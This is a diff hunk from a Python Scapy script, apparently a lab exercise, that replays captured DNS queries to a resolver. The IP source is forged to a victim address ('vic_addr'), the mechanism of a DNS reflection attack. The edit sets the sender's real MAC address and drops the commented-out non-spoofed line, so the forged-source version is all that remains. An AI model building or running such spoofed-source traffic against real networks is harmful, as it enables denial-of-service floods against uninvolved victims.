@@ -47,10 +47,8 @@ def main():
         if pkt.qr == 0: # the packet is query
             q_pkt.append(pkt)
 
-    #pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
-    pkt = Ether(src='00:00:00:00:01:01', dst='ff:ff:ff:ff:ff:ff')
+    pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
     pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[random.randint(0, len(q_pkt))].getlayer(DNS)
-    #pkt = pkt /IP(dst=addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[random.randint(0, len(q_pkt))].getlayer(DNS)
     sendp(pkt, iface = iface, verbose=False)
 
     print pkt.show()
